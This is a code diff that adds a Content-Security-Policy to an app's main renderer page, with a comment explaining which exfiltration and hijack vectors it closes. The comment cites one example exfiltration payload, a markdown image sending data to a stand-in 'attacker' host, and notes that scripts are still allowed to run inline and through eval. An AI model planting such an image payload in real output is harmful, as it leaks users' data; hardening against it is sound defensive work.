@@ -13,6 +13,39 @@
       fallback (Apple SD Gothic Neo / Noto Sans KR / Malgun Gothic) 으로 처리.
       plugin webview 의 UA default 와 letterform 이 정합 — 이슈 #556.
     -->
+    <!--
+      Content-Security-Policy for the MAIN renderer.
+      —
+      This window holds the full host preload, so it is the one surface where a
+      DOM-injection bug would reach the whole `lvisApi` bridge. Every other
+      surface (plugin UI shell, MCP app, HTML preview, link and auth windows)
+      already ships a CSP; this one did not.
+      —
+      Deliberately narrow. It closes EXFILTRATION and document-hijack vectors
+      and leaves script/style execution alone:
+        • `connect-src 'none'` — the renderer makes no direct network calls at
+          all (verified: no fetch/XHR/WebSocket anywhere under src/ui/renderer);
+          everything goes through IPC to main. So an injected script has no
+          outbound channel from this document.
+        • `img-src 'self' data: blob:` — no remote image loads. That is the
+          zero-click exfil channel (`![](https://attacker/?d=…)`); rendering is
+          already blocked in AssistantCard, and this is the platform-level
+          backstop under it.
+        • `object-src 'none'`, `base-uri 'none'`, `form-action 'none'` — no
+          plugins, no <base> rewrite of every relative URL, no form posts.
+        • `frame-src 'self'` — the sandboxed preview frames are same-origin
+          srcdoc; remote frames are not a thing here.
+      —
+      NOT constrained: `script-src` and `style-src`. Both are same-origin bundles,
+      and Tailwind plus React inline styles need `'unsafe-inline'` for style
+      anyway — declaring it would state a restriction that isn't one. A CSP is
+      defence in depth here, not the control; the control is that the markdown
+      renderer emits no remote-loading elements (see markdown-safe.tsx).
+    -->
+    <meta
+      http-equiv="Content-Security-Policy"
+      content="default-src 'self'; connect-src 'none'; img-src 'self' data: blob:; media-src 'self' data: blob:; font-src 'self'; object-src 'none'; base-uri 'none'; form-action 'none'; frame-src 'self'; script-src 'self' 'unsafe-inline' 'unsafe-eval'; style-src 'self' 'unsafe-inline';"
+    />
     <link rel="stylesheet" href="./styles.css" />
   </head>
   <body class="min-h-screen bg-background text-foreground antialiased">
